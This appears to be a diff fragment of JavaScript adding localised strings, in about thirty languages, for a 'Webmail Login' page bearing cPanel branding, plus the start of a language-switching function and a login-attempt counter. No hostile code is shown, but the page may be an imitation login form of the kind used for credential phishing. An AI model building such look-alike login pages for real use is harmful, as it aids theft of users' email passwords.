+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Privacy Policy",
+  localeChange: "Change locale",
+  moreLocales: "More locales",
+  selectLocale: "Select a locale:",
+  modalOk: "OK",
+  modalTitleError: "Something went wrong",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Success"
+},
+ar: {
+  title: "تسجيل دخول البريد الإلكتروني",
+  emailLabel: "عنوان البريد الإلكتروني",
+  emailPlaceholder: "أدخل عنوان بريدك الإلكتروني.",
+  passwordLabel: "كلمة المرور",
+  passwordPlaceholder: "أدخل كلمة مرور بريدك الإلكتروني.",
+  loginButton: "تسجيل الدخول",
+  signingIn: "جاري تسجيل الدخول...",
+  errorEmailPassword: "يرجى إدخال عنوان بريدك الإلكتروني وكلمة المرور.",
+  errorInvalidCredentials: "اسم المستخدم أو كلمة المرور التي أدخلتها غير صحيحة. حاول إدخالها مرة أخرى.",
+  loginSuccess: "تم تسجيل الدخول بنجاح، جاري إعادة التوجيه...",
+  copyright: "حقوق النشر© 2025 cPanel، L.L.C.",
+  privacyPolicy: "سياسة الخصوصية",
+  localeChange: "تغيير اللغة",
+  moreLocales: "المزيد من اللغات",
+  selectLocale: "اختر اللغة:",
+  modalOk: "موافق",
+  modalTitleError: "هناك خطأ",
+  modalTitleInfo: "معلومات",
+  modalTitleSuccess: "نجاح"
+},
+es: {
+  title: "Inicio de Sesión de Webmail",
+  emailLabel: "Dirección de Correo Electrónico",
+  emailPlaceholder: "Ingrese su dirección de correo electrónico.",
+  passwordLabel: "Contraseña",
+  passwordPlaceholder: "Ingrese su contraseña de correo electrónico.",
+  loginButton: "Iniciar Sesión",
+  signingIn: "Iniciando sesión...",
+  errorEmailPassword: "Por favor ingrese su dirección de correo electrónico y contraseña.",
+  errorInvalidCredentials: "El nombre de usuario o contraseña que ingresó no es correcto. Intente ingresarlo nuevamente.",
+  loginSuccess: "Inicio de sesión exitoso, redirigiendo...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Política de Privacidad",
+  localeChange: "Cambiar idioma",
+  moreLocales: "Más idiomas",
+  selectLocale: "Seleccione un idioma:",
+  modalOk: "Aceptar",
+  modalTitleError: "Ocurrió un problema",
+  modalTitleInfo: "Información",
+  modalTitleSuccess: "Éxito"
+},
+fr: {
+  title: "Connexion Webmail",
+  emailLabel: "Adresse E-mail",
+  emailPlaceholder: "Entrez votre adresse e-mail.",
+  passwordLabel: "Mot de passe",
+  passwordPlaceholder: "Entrez votre mot de passe e-mail.",
+  loginButton: "Se connecter",
+  signingIn: "Connexion en cours...",
+  errorEmailPassword: "Veuillez entrer votre adresse e-mail et votre mot de passe.",
+  errorInvalidCredentials: "Le nom d'utilisateur ou le mot de passe que vous avez entré n'est pas correct. Essayez de l'entrer à nouveau.",
+  loginSuccess: "Connexion réussie, redirection...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Politique de confidentialité",
+  localeChange: "Changer de langue",
+  moreLocales: "Plus de langues",
+  selectLocale: "Sélectionnez une langue:",
+  modalOk: "OK",
+  modalTitleError: "Un problème est survenu",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Succès"
+},
+de: {
+  title: "Webmail-Anmeldung",
+  emailLabel: "E-Mail-Adresse",
+  emailPlaceholder: "Geben Sie Ihre E-Mail-Adresse ein.",
+  passwordLabel: "Passwort",
+  passwordPlaceholder: "Geben Sie Ihr E-Mail-Passwort ein.",
+  loginButton: "Anmelden",
+  signingIn: "Anmeldung läuft...",
+  errorEmailPassword: "Bitte geben Sie Ihre E-Mail-Adresse und Ihr Passwort ein.",
+  errorInvalidCredentials: "Der Benutzername oder das Passwort, das Sie eingegeben haben, ist nicht korrekt. Versuchen Sie es erneut einzugeben.",
+  loginSuccess: "Anmeldung erfolgreich, Weiterleitung...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Datenschutzrichtlinie",
+  localeChange: "Sprache ändern",
+  moreLocales: "Weitere Sprachen",
+  selectLocale: "Wählen Sie eine Sprache:",
+  modalOk: "OK",
+  modalTitleError: "Etwas ist schief gelaufen",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Erfolg"
+},
+ja: {
+  title: "Webmail ログイン",
+  emailLabel: "メールアドレス",
+  emailPlaceholder: "メールアドレスを入力してください。",
+  passwordLabel: "パスワード",
+  passwordPlaceholder: "メールパスワードを入力してください。",
+  loginButton: "ログイン",
+  signingIn: "ログイン中...",
+  errorEmailPassword: "メールアドレスとパスワードを入力してください。",
+  errorInvalidCredentials: "入力されたユーザー名またはパスワードが正しくありません。再度入力してください。",
+  loginSuccess: "ログインに成功しました。リダイレクト中...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "プライバシーポリシー",
+  localeChange: "言語を変更",
+  moreLocales: "その他の言語",
+  selectLocale: "言語を選択してください:",
+  modalOk: "OK",
+  modalTitleError: "何か問題が発生しました",
+  modalTitleInfo: "情報",
+  modalTitleSuccess: "成功"
+},
+zh: {
+  title: "Webmail 登录",
+  emailLabel: "电子邮件地址",
+  emailPlaceholder: "请输入您的电子邮件地址。",
+  passwordLabel: "密码",
+  passwordPlaceholder: "请输入您的电子邮件密码。",
+  loginButton: "登录",
+  signingIn: "正在登录...",
+  errorEmailPassword: "请输入您的电子邮件地址和密码。",
+  errorInvalidCredentials: "您输入的用户名或密码不正确。请重新输入。",
+  loginSuccess: "登录成功，正在重定向...",
+  copyright: "版权所有© 2025 cPanel, L.L.C.",
+  privacyPolicy: "隐私政策",
+  localeChange: "更改语言",
+  moreLocales: "更多语言",
+  selectLocale: "选择语言:",
+  modalOk: "确定",
+  modalTitleError: "发生错误",
+  modalTitleInfo: "信息",
+  modalTitleSuccess: "成功"
+},
+ru: {
+  title: "Вход в Webmail",
+  emailLabel: "Адрес электронной почты",
+  emailPlaceholder: "Введите ваш адрес электронной почты.",
+  passwordLabel: "Пароль",
+  passwordPlaceholder: "Введите пароль от вашей электронной почты.",
+  loginButton: "Войти",
+  signingIn: "Выполняется вход...",
+  errorEmailPassword: "Пожалуйста, введите ваш адрес электронной почты и пароль.",
+  errorInvalidCredentials: "Имя пользователя или пароль, которые вы ввели, неверны. Попробуйте ввести их снова.",
+  loginSuccess: "Вход выполнен успешно, перенаправление...",
+  copyright: "Авторское право© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Политика конфиденциальности",
+  localeChange: "Изменить язык",
+  moreLocales: "Больше языков",
+  selectLocale: "Выберите язык:",
+  modalOk: "OK",
+  modalTitleError: "Что-то пошло не так",
+  modalTitleInfo: "Информация",
+  modalTitleSuccess: "Успех"
+},
+cs: {
+  title: "Webmail Přihlášení",
+  emailLabel: "E-mailová adresa",
+  emailPlaceholder: "Zadejte svou e-mailovou adresu.",
+  passwordLabel: "Heslo",
+  passwordPlaceholder: "Zadejte své e-mailové heslo.",
+  loginButton: "Přihlásit se",
+  signingIn: "Přihlašování...",
+  errorEmailPassword: "Prosím zadejte svou e-mailovou adresu a heslo.",
+  errorInvalidCredentials: "Uživatelské jméno nebo heslo, které jste zadali, není správné. Zkuste je zadat znovu.",
+  loginSuccess: "Přihlášení úspěšné, přesměrování...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Zásady ochrany osobních údajů",
+  localeChange: "Změnit jazyk",
+  moreLocales: "Více jazyků",
+  selectLocale: "Vyberte jazyk:",
+  modalOk: "OK",
+  modalTitleError: "Něco se pokazilo",
+  modalTitleInfo: "Informace",
+  modalTitleSuccess: "Úspěch"
+},
+da: {
+  title: "Webmail Login",
+  emailLabel: "E-mailadresse",
+  emailPlaceholder: "Indtast din e-mailadresse.",
+  passwordLabel: "Adgangskode",
+  passwordPlaceholder: "Indtast din e-mail adgangskode.",
+  loginButton: "Log ind",
+  signingIn: "Logger ind...",
+  errorEmailPassword: "Indtast venligst din e-mailadresse og adgangskode.",
+  errorInvalidCredentials: "Brugernavnet eller adgangskoden, du indtastede, er ikke korrekt. Prøv at indtaste den igen.",
+  loginSuccess: "Login succesfuld, omdirigerer...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Privatlivspolitik",
+  localeChange: "Skift sprog",
+  moreLocales: "Flere sprog",
+  selectLocale: "Vælg et sprog:",
+  modalOk: "OK",
+  modalTitleError: "Noget gik galt",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Succes"
+},
+el: {
+  title: "Σύνδεση Webmail",
+  emailLabel: "Διεύθυνση Email",
+  emailPlaceholder: "Εισάγετε τη διεύθυνση email σας.",
+  passwordLabel: "Κωδικός πρόσβασης",
+  passwordPlaceholder: "Εισάγετε τον κωδικό πρόσβασης email σας.",
+  loginButton: "Σύνδεση",
+  signingIn: "Σύνδεση σε εξέλιξη...",
+  errorEmailPassword: "Παρακαλώ εισάγετε τη διεύθυνση email και τον κωδικό πρόσβασης σας.",
+  errorInvalidCredentials: "Το όνομα χρήστη ή ο κωδικός πρόσβασης που εισάγατε δεν είναι σωστό. Δοκιμάστε να τον εισάγετε ξανά.",
+  loginSuccess: "Επιτυχής σύνδεση, ανακατεύθυνση...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Πολιτική Απορρήτου",
+  localeChange: "Αλλαγή γλώσσας",
+  moreLocales: "Περισσότερες γλώσσες",
+  selectLocale: "Επιλέξτε γλώσσα:",
+  modalOk: "OK",
+  modalTitleError: "Κάτι πήγε στραβά",
+  modalTitleInfo: "Πληροφορίες",
+  modalTitleSuccess: "Επιτυχία"
+},
+fi: {
+  title: "Webmail Kirjautuminen",
+  emailLabel: "Sähköpostiosoite",
+  emailPlaceholder: "Syötä sähköpostiosoitteesi.",
+  passwordLabel: "Salasana",
+  passwordPlaceholder: "Syötä sähköpostisi salasana.",
+  loginButton: "Kirjaudu sisään",
+  signingIn: "Kirjaudutaan sisään...",
+  errorEmailPassword: "Syötä sähköpostiosoitteesi ja salasanasi.",
+  errorInvalidCredentials: "Käyttäjänimi tai salasana, jonka syötit, ei ole oikein. Yritä syöttää se uudelleen.",
+  loginSuccess: "Kirjautuminen onnistui, ohjataan...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Tietosuojakäytäntö",
+  localeChange: "Vaihda kieltä",
+  moreLocales: "Lisää kieliä",
+  selectLocale: "Valitse kieli:",
+  modalOk: "OK",
+  modalTitleError: "Jokin meni pieleen",
+  modalTitleInfo: "Tiedot",
+  modalTitleSuccess: "Onnistui"
+},
+fil: {
+  title: "Webmail Pag-login",
+  emailLabel: "Email Address",
+  emailPlaceholder: "Ilagay ang iyong email address.",
+  passwordLabel: "Password",
+  passwordPlaceholder: "Ilagay ang iyong email password.",
+  loginButton: "Mag-login",
+  signingIn: "Nag-lo-login...",
+  errorEmailPassword: "Mangyaring ilagay ang iyong email address at password.",
+  errorInvalidCredentials: "Ang username o password na inilagay mo ay hindi tama. Subukan mong ilagay ito muli.",
+  loginSuccess: "Matagumpay ang pag-login, nagre-redirect...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Patakaran sa Privacy",
+  localeChange: "Baguhin ang wika",
+  moreLocales: "Higit pang mga wika",
+  selectLocale: "Pumili ng wika:",
+  modalOk: "OK",
+  modalTitleError: "May nangyaring mali",
+  modalTitleInfo: "Impormasyon",
+  modalTitleSuccess: "Tagumpay"
+},
+he: {
+  title: "התחברות Webmail",
+  emailLabel: "כתובת דוא\"ל",
+  emailPlaceholder: "הזן את כתובת הדוא\"ל שלך.",
+  passwordLabel: "סיסמה",
+  passwordPlaceholder: "הזן את סיסמת הדוא\"ל שלך.",
+  loginButton: "התחבר",
+  signingIn: "מתחבר...",
+  errorEmailPassword: "אנא הזן את כתובת הדוא\"ל והסיסמה שלך.",
+  errorInvalidCredentials: "שם המשתמש או הסיסמה שהזנת אינם נכונים. נסה להזין אותם שוב.",
+  loginSuccess: "ההתחברות הצליחה, מפנה...",
+  copyright: "זכויות יוצרים© 2025 cPanel, L.L.C.",
+  privacyPolicy: "מדיניות פרטיות",
+  localeChange: "שנה שפה",
+  moreLocales: "שפות נוספות",
+  selectLocale: "בחר שפה:",
+  modalOk: "אישור",
+  modalTitleError: "משהו השתבש",
+  modalTitleInfo: "מידע",
+  modalTitleSuccess: "הצלחה"
+},
+hu: {
+  title: "Webmail Bejelentkezés",
+  emailLabel: "E-mail cím",
+  emailPlaceholder: "Adja meg az e-mail címét.",
+  passwordLabel: "Jelszó",
+  passwordPlaceholder: "Adja meg az e-mail jelszavát.",
+  loginButton: "Bejelentkezés",
+  signingIn: "Bejelentkezés...",
+  errorEmailPassword: "Kérjük, adja meg az e-mail címét és jelszavát.",
+  errorInvalidCredentials: "A megadott felhasználónév vagy jelszó nem helyes. Próbálja meg újra megadni.",
+  loginSuccess: "Sikeres bejelentkezés, átirányítás...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Adatvédelmi irányelvek",
+  localeChange: "Nyelv módosítása",
+  moreLocales: "Több nyelv",
+  selectLocale: "Válasszon nyelvet:",
+  modalOk: "OK",
+  modalTitleError: "Valami hiba történt",
+  modalTitleInfo: "Információ",
+  modalTitleSuccess: "Sikeres"
+},
+id: {
+  title: "Login Webmail",
+  emailLabel: "Alamat Email",
+  emailPlaceholder: "Masukkan alamat email Anda.",
+  passwordLabel: "Kata Sandi",
+  passwordPlaceholder: "Masukkan kata sandi email Anda.",
+  loginButton: "Masuk",
+  signingIn: "Sedang masuk...",
+  errorEmailPassword: "Silakan masukkan alamat email dan kata sandi Anda.",
+  errorInvalidCredentials: "Nama pengguna atau kata sandi yang Anda masukkan tidak benar. Coba masukkan lagi.",
+  loginSuccess: "Login berhasil, mengalihkan...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Kebijakan Privasi",
+  localeChange: "Ubah bahasa",
+  moreLocales: "Bahasa lainnya",
+  selectLocale: "Pilih bahasa:",
+  modalOk: "OK",
+  modalTitleError: "Ada yang salah",
+  modalTitleInfo: "Informasi",
+  modalTitleSuccess: "Berhasil"
+},
+it: {
+  title: "Accesso Webmail",
+  emailLabel: "Indirizzo Email",
+  emailPlaceholder: "Inserisci il tuo indirizzo email.",
+  passwordLabel: "Password",
+  passwordPlaceholder: "Inserisci la password della tua email.",
+  loginButton: "Accedi",
+  signingIn: "Accesso in corso...",
+  errorEmailPassword: "Inserisci il tuo indirizzo email e la password.",
+  errorInvalidCredentials: "Il nome utente o la password che hai inserito non è corretto. Prova a inserirli di nuovo.",
+  loginSuccess: "Accesso riuscito, reindirizzamento...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Informativa sulla privacy",
+  localeChange: "Cambia lingua",
+  moreLocales: "Altre lingue",
+  selectLocale: "Seleziona una lingua:",
+  modalOk: "OK",
+  modalTitleError: "Qualcosa è andato storto",
+  modalTitleInfo: "Informazione",
+  modalTitleSuccess: "Successo"
+},
+ko: {
+  title: "웹메일 로그인",
+  emailLabel: "이메일 주소",
+  emailPlaceholder: "이메일 주소를 입력하세요.",
+  passwordLabel: "비밀번호",
+  passwordPlaceholder: "이메일 비밀번호를 입력하세요.",
+  loginButton: "로그인",
+  signingIn: "로그인 중...",
+  errorEmailPassword: "이메일 주소와 비밀번호를 입력해 주세요.",
+  errorInvalidCredentials: "입력한 사용자 이름 또는 비밀번호가 올바르지 않습니다. 다시 입력해 보세요.",
+  loginSuccess: "로그인 성공, 리디렉션 중...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "개인정보처리방침",
+  localeChange: "언어 변경",
+  moreLocales: "더 많은 언어",
+  selectLocale: "언어를 선택하세요:",
+  modalOk: "OK",
+  modalTitleError: "문제가 발생했습니다",
+  modalTitleInfo: "정보",
+  modalTitleSuccess: "성공"
+},
+ms: {
+  title: "Log Masuk Webmail",
+  emailLabel: "Alamat E-mel",
+  emailPlaceholder: "Masukkan alamat e-mel anda.",
+  passwordLabel: "Kata Laluan",
+  passwordPlaceholder: "Masukkan kata laluan e-mel anda.",
+  loginButton: "Log Masuk",
+  signingIn: "Sedang log masuk...",
+  errorEmailPassword: "Sila masukkan alamat e-mel dan kata laluan anda.",
+  errorInvalidCredentials: "Nama pengguna atau kata laluan yang anda masukkan tidak betul. Cuba masukkan semula.",
+  loginSuccess: "Log masuk berjaya, mengalihkan...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Dasar Privasi",
+  localeChange: "Tukar bahasa",
+  moreLocales: "Lebih banyak bahasa",
+  selectLocale: "Pilih bahasa:",
+  modalOk: "OK",
+  modalTitleError: "Ada yang salah",
+  modalTitleInfo: "Maklumat",
+  modalTitleSuccess: "Berjaya"
+},
+nb: {
+  title: "Webmail Innlogging",
+  emailLabel: "E-postadresse",
+  emailPlaceholder: "Skriv inn din e-postadresse.",
+  passwordLabel: "Passord",
+  passwordPlaceholder: "Skriv inn ditt e-postpassord.",
+  loginButton: "Logg inn",
+  signingIn: "Logger inn...",
+  errorEmailPassword: "Vennligst skriv inn din e-postadresse og passord.",
+  errorInvalidCredentials: "Brukernavnet eller passordet du skrev inn er ikke riktig. Prøv å skrive det inn igjen.",
+  loginSuccess: "Innlogging vellykket, omdirigerer...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Personvernregler",
+  localeChange: "Endre språk",
+  moreLocales: "Flere språk",
+  selectLocale: "Velg et språk:",
+  modalOk: "OK",
+  modalTitleError: "Noe gikk galt",
+  modalTitleInfo: "Informasjon",
+  modalTitleSuccess: "Suksess"
+},
+nl: {
+  title: "Webmail Aanmelden",
+  emailLabel: "E-mailadres",
+  emailPlaceholder: "Voer uw e-mailadres in.",
+  passwordLabel: "Wachtwoord",
+  passwordPlaceholder: "Voer uw e-mailwachtwoord in.",
+  loginButton: "Aanmelden",
+  signingIn: "Aanmelden...",
+  errorEmailPassword: "Voer uw e-mailadres en wachtwoord in.",
+  errorInvalidCredentials: "De gebruikersnaam of het wachtwoord dat u heeft ingevoerd is niet correct. Probeer het opnieuw in te voeren.",
+  loginSuccess: "Aanmelden gelukt, doorverwijzen...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Privacybeleid",
+  localeChange: "Taal wijzigen",
+  moreLocales: "Meer talen",
+  selectLocale: "Selecteer een taal:",
+  modalOk: "OK",
+  modalTitleError: "Iets ging mis",
+  modalTitleInfo: "Informatie",
+  modalTitleSuccess: "Succes"
+},
+pl: {
+  title: "Logowanie Webmail",
+  emailLabel: "Adres e-mail",
+  emailPlaceholder: "Wprowadź swój adres e-mail.",
+  passwordLabel: "Hasło",
+  passwordPlaceholder: "Wprowadź hasło do swojej poczty e-mail.",
+  loginButton: "Zaloguj się",
+  signingIn: "Logowanie...",
+  errorEmailPassword: "Wprowadź swój adres e-mail i hasło.",
+  errorInvalidCredentials: "Nazwa użytkownika lub hasło, które wprowadziłeś, nie jest poprawne. Spróbuj wprowadzić je ponownie.",
+  loginSuccess: "Logowanie udane, przekierowywanie...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Polityka prywatności",
+  localeChange: "Zmień język",
+  moreLocales: "Więcej języków",
+  selectLocale: "Wybierz język:",
+  modalOk: "OK",
+  modalTitleError: "Coś poszło nie tak",
+  modalTitleInfo: "Informacja",
+  modalTitleSuccess: "Sukces"
+},
+pt: {
+  title: "Login Webmail",
+  emailLabel: "Endereço de E-mail",
+  emailPlaceholder: "Digite seu endereço de e-mail.",
+  passwordLabel: "Senha",
+  passwordPlaceholder: "Digite sua senha de e-mail.",
+  loginButton: "Entrar",
+  signingIn: "Entrando...",
+  errorEmailPassword: "Por favor, digite seu endereço de e-mail e senha.",
+  errorInvalidCredentials: "O nome de usuário ou senha que você digitou não está correto. Tente digitá-lo novamente.",
+  loginSuccess: "Login bem-sucedido, redirecionando...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Política de Privacidade",
+  localeChange: "Alterar idioma",
+  moreLocales: "Mais idiomas",
+  selectLocale: "Selecione um idioma:",
+  modalOk: "OK",
+  modalTitleError: "Algo deu errado",
+  modalTitleInfo: "Informação",
+  modalTitleSuccess: "Sucesso"
+},
+pt_br: {
+  title: "Login Webmail",
+  emailLabel: "Endereço de E-mail",
+  emailPlaceholder: "Digite seu endereço de e-mail.",
+  passwordLabel: "Senha",
+  passwordPlaceholder: "Digite sua senha de e-mail.",
+  loginButton: "Entrar",
+  signingIn: "Entrando...",
+  errorEmailPassword: "Por favor, digite seu endereço de e-mail e senha.",
+  errorInvalidCredentials: "O nome de usuário ou senha que você digitou não está correto. Tente digitá-lo novamente.",
+  loginSuccess: "Login bem-sucedido, redirecionando...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Política de Privacidade",
+  localeChange: "Alterar idioma",
+  moreLocales: "Mais idiomas",
+  selectLocale: "Selecione um idioma:",
+  modalOk: "OK",
+  modalTitleError: "Algo deu errado",
+  modalTitleInfo: "Informação",
+  modalTitleSuccess: "Sucesso"
+},
+ro: {
+  title: "Autentificare Webmail",
+  emailLabel: "Adresă de e-mail",
+  emailPlaceholder: "Introduceți adresa dvs. de e-mail.",
+  passwordLabel: "Parolă",
+  passwordPlaceholder: "Introduceți parola dvs. de e-mail.",
+  loginButton: "Autentificare",
+  signingIn: "Se autentifică...",
+  errorEmailPassword: "Vă rugăm să introduceți adresa dvs. de e-mail și parola.",
+  errorInvalidCredentials: "Numele de utilizator sau parola pe care ați introdus-o nu este corectă. Încercați să o introduceți din nou.",
+  loginSuccess: "Autentificare reușită, redirecționare...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Politica de confidențialitate",
+  localeChange: "Schimbă limba",
+  moreLocales: "Mai multe limbi",
+  selectLocale: "Selectați o limbă:",
+  modalOk: "OK",
+  modalTitleError: "Ceva nu a mers bine",
+  modalTitleInfo: "Informație",
+  modalTitleSuccess: "Succes"
+},
+sv: {
+  title: "Webmail Inloggning",
+  emailLabel: "E-postadress",
+  emailPlaceholder: "Ange din e-postadress.",
+  passwordLabel: "Lösenord",
+  passwordPlaceholder: "Ange ditt e-postlösenord.",
+  loginButton: "Logga in",
+  signingIn: "Loggar in...",
+  errorEmailPassword: "Ange din e-postadress och lösenord.",
+  errorInvalidCredentials: "Användarnamnet eller lösenordet du angav är inte korrekt. Försök att ange det igen.",
+  loginSuccess: "Inloggning lyckades, omdirigerar...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Integritetspolicy",
+  localeChange: "Ändra språk",
+  moreLocales: "Fler språk",
+  selectLocale: "Välj ett språk:",
+  modalOk: "OK",
+  modalTitleError: "Något gick fel",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Lyckades"
+},
+th: {
+  title: "เข้าสู่ระบบ Webmail",
+  emailLabel: "ที่อยู่อีเมล",
+  emailPlaceholder: "ป้อนที่อยู่อีเมลของคุณ",
+  passwordLabel: "รหัสผ่าน",
+  passwordPlaceholder: "ป้อนรหัสผ่านอีเมลของคุณ",
+  loginButton: "เข้าสู่ระบบ",
+  signingIn: "กำลังเข้าสู่ระบบ...",
+  errorEmailPassword: "กรุณาป้อนที่อยู่อีเมลและรหัสผ่านของคุณ",
+  errorInvalidCredentials: "ชื่อผู้ใช้หรือรหัสผ่านที่คุณป้อนไม่ถูกต้อง ลองป้อนอีกครั้ง",
+  loginSuccess: "เข้าสู่ระบบสำเร็จ กำลังเปลี่ยนเส้นทาง...",
+  copyright: "ลิขสิทธิ์© 2025 cPanel, L.L.C.",
+  privacyPolicy: "นโยบายความเป็นส่วนตัว",
+  localeChange: "เปลี่ยนภาษา",
+  moreLocales: "ภาษาอื่นๆ",
+  selectLocale: "เลือกภาษา:",
+  modalOk: "OK",
+  modalTitleError: "มีบางอย่างผิดพลาด",
+  modalTitleInfo: "ข้อมูล",
+  modalTitleSuccess: "สำเร็จ"
+},
+tr: {
+  title: "Webmail Giriş",
+  emailLabel: "E-posta Adresi",
+  emailPlaceholder: "E-posta adresinizi girin.",
+  passwordLabel: "Şifre",
+  passwordPlaceholder: "E-posta şifrenizi girin.",
+  loginButton: "Giriş Yap",
+  signingIn: "Giriş yapılıyor...",
+  errorEmailPassword: "Lütfen e-posta adresinizi ve şifrenizi girin.",
+  errorInvalidCredentials: "Girdiğiniz kullanıcı adı veya şifre doğru değil. Tekrar girmeyi deneyin.",
+  loginSuccess: "Giriş başarılı, yönlendiriliyor...",
+  copyright: "Telif Hakkı© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Gizlilik Politikası",
+  localeChange: "Dili değiştir",
+  moreLocales: "Daha fazla dil",
+  selectLocale: "Bir dil seçin:",
+  modalOk: "OK",
+  modalTitleError: "Bir şey yanlış gitti",
+  modalTitleInfo: "Bilgi",
+  modalTitleSuccess: "Başarılı"
+},
+uk: {
+  title: "Вхід у Webmail",
+  emailLabel: "Адреса електронної пошти",
+  emailPlaceholder: "Введіть вашу адресу електронної пошти.",
+  passwordLabel: "Пароль",
+  passwordPlaceholder: "Введіть пароль від вашої електронної пошти.",
+  loginButton: "Увійти",
+  signingIn: "Виконується вхід...",
+  errorEmailPassword: "Будь ласка, введіть вашу адресу електронної пошти та пароль.",
+  errorInvalidCredentials: "Ім'я користувача або пароль, які ви ввели, неправильні. Спробуйте ввести їх знову.",
+  loginSuccess: "Вхід виконано успішно, перенаправлення...",
+  copyright: "Авторське право© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Політика конфіденційності",
+  localeChange: "Змінити мову",
+  moreLocales: "Більше мов",
+  selectLocale: "Виберіть мову:",
+  modalOk: "OK",
+  modalTitleError: "Щось пішло не так",
+  modalTitleInfo: "Інформація",
+  modalTitleSuccess: "Успіх"
+},
+vi: {
+  title: "Đăng nhập Webmail",
+  emailLabel: "Địa chỉ Email",
+  emailPlaceholder: "Nhập địa chỉ email của bạn.",
+  passwordLabel: "Mật khẩu",
+  passwordPlaceholder: "Nhập mật khẩu email của bạn.",
+  loginButton: "Đăng nhập",
+  signingIn: "Đang đăng nhập...",
+  errorEmailPassword: "Vui lòng nhập địa chỉ email và mật khẩu của bạn.",
+  errorInvalidCredentials: "Tên người dùng hoặc mật khẩu bạn nhập không đúng. Hãy thử nhập lại.",
+  loginSuccess: "Đăng nhập thành công, đang chuyển hướng...",
+  copyright: "Bản quyền© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Chính sách bảo mật",
+  localeChange: "Thay đổi ngôn ngữ",
+  moreLocales: "Thêm ngôn ngữ",
+  selectLocale: "Chọn ngôn ngữ:",
+  modalOk: "OK",
+  modalTitleError: "Có gì đi sai",
+  modalTitleInfo: "Thông tin",
+  modalTitleSuccess: "Thành công"
+},
+zh_tw: {
+  title: "Webmail 登入",
+  emailLabel: "電子郵件地址",
+  emailPlaceholder: "請輸入您的電子郵件地址。",
+  passwordLabel: "密碼",
+  passwordPlaceholder: "請輸入您的電子郵件密碼。",
+  loginButton: "登入",
+  signingIn: "正在登入...",
+  errorEmailPassword: "請輸入您的電子郵件地址和密碼。",
+  errorInvalidCredentials: "您輸入的使用者名稱或密碼不正確。請重新輸入。",
+  loginSuccess: "登入成功，正在重新導向...",
+  copyright: "版權所有© 2025 cPanel, L.L.C.",
+  privacyPolicy: "隱私權政策",
+  localeChange: "變更語言",
+  moreLocales: "更多語言",
+  selectLocale: "選擇語言:",
+  modalOk: "確定",
+  modalTitleError: "發生錯誤",
+  modalTitleInfo: "資訊",
+  modalTitleSuccess: "成功"
+},
+es_es: {
+  title: "Inicio de Sesión de Webmail (España)",
+  emailLabel: "Dirección de correo electrónico",
+  emailPlaceholder: "Introduce tu dirección de correo electrónico.",
+  passwordLabel: "Contraseña",
+  passwordPlaceholder: "Introduce tu contraseña de correo electrónico.",
+  loginButton: "Iniciar sesión",
+  signingIn: "Iniciando sesión...",
+  errorEmailPassword: "Por favor, introduce tu dirección de correo electrónico y contraseña.",
+  errorInvalidCredentials: "El nombre de usuario o la contraseña no son correctos. Inténtalo de nuevo.",
+  loginSuccess: "Inicio de sesión correcto, redirigiendo...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Política de privacidad",
+  localeChange: "Cambiar idioma",
+  moreLocales: "Más idiomas",
+  selectLocale: "Selecciona un idioma:",
+  modalOk: "Aceptar",
+  modalTitleError: "Algo salió mal",
+  modalTitleInfo: "Información",
+  modalTitleSuccess: "Éxito"
+},
+i_en: {
+  title: "Webmail Login",
+  emailLabel: "Email Address",
+  emailPlaceholder: "Enter your email address.",
+  passwordLabel: "Password",
+  passwordPlaceholder: "Enter your email password.",
+  loginButton: "Log in",
+  signingIn: "Signing in...",
+  errorEmailPassword: "Please enter your email address and password.",
+  errorInvalidCredentials: "The username or password you entered isn't correct. Try entering it again.",
+  loginSuccess: "Login successful, redirecting...",
+  copyright: "Copyright© 2025 cPanel, L.L.C.",
+  privacyPolicy: "Privacy Policy",
+  localeChange: "Change locale",
+  moreLocales: "More locales",
+  selectLocale: "Select a locale:",
+  modalOk: "OK",
+  modalTitleError: "Something went wrong",
+  modalTitleInfo: "Information",
+  modalTitleSuccess: "Success"
+}
 };
 
 let currentLanguage = 'en';
@@ -1169,234 +1172,286 @@ let loginAttempts = 0;
 
 // Function to change language
 function changeLanguage(lang) {
-  currentLanguage = lang;
-  const t = translations[lang] || translations.en;
-  
-  // Update page title
-  document.title = t.title;
-  
-  // Update form labels and placeholders
-  const emailLabel = document.querySelector('label[for="user"]');
-  const passwordLabel = document.querySelector('label[for="pass"]');
